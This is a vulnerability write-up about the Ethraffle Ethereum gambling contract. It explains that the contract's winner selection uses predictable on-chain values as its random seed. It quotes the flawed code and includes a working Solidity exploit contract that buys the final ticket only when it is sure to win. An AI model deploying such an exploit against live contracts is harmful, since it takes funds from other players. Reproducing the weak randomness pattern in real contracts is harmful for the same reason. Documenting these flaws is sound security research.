Ethraffle
======
https://etherscan.io/address/0x9A3dA065e1100a5613dc15b594f0F6193B419E96#code

Vulnerability type
------
Bad randomness

Abstract
------
A gambling smart contract implementation for Ethraffle, an Ethereum gambling game, sells tickets and after the last ticket in a round was sold randomly generates a winner from all the buyers who will claim the price, generates a random value that is predictable by attacker. The developer wrote a `chooseWinner()` function that uses `block coinbase` as the seed. This can be predicted by writing the same random function code in an exploit contract to determine the `winningNumber` value, thus the attacker can always win.

Related code
------

    function buyTickets() payable public {
        ......
        // Choose winner if we sold all the tickets
        if (nextTicket > totalTickets) {
            chooseWinner();
        }
        ......
    }
    
    function chooseWinner() private {
        // Pseudorandom number generator
        uint remainingGas = msg.gas;
        bytes32 sha = sha3(
            block.coinbase,
            tx.origin,
            remainingGas
        );

        uint winningNumber = (uint(sha) % totalTickets) + 1;
        address winningAddress = contestants[winningNumber].addr;
        ......
    }

Details
------
After all tickets in a round(6 ticket for a round) was sold, `chooseWinner()` randomly generates a winner from all buyers. However, the seed of randomness, `block.coinbase` and `remainingGas`, can be accessed before the transaction, so the attacker can exploit this vulnerability to always win in the game.

Exploit
------
    contract Exploit{
    
        Ethraffle target;
        
        uint constant totalTickets = 6;
        
        function Exploit(address _target) public payable{
            target = Ethraffle(_target);
        }
    
        function attack(uint256 _amount) public payable{
        
            uint current_sold = target.nextTicket();
            if(current_sold + 1 > totalTickets){
                bytes32 sha = sha3(block.coinbase, msg.sender, msg.gas);
                uint winningNumber = (uint(sha) % totalTickets) + 1;
                
                if(winningNumber == totalTickets){          //if we can win
                    target.buyTickets.value(_amount)();
                    msg.sender.transfer(this.balance);
                }

            }
            
        }
    }
    
    contract Ethraffle
    {
        function buyTickets() payable public;
        uint public nextTicket;
    }
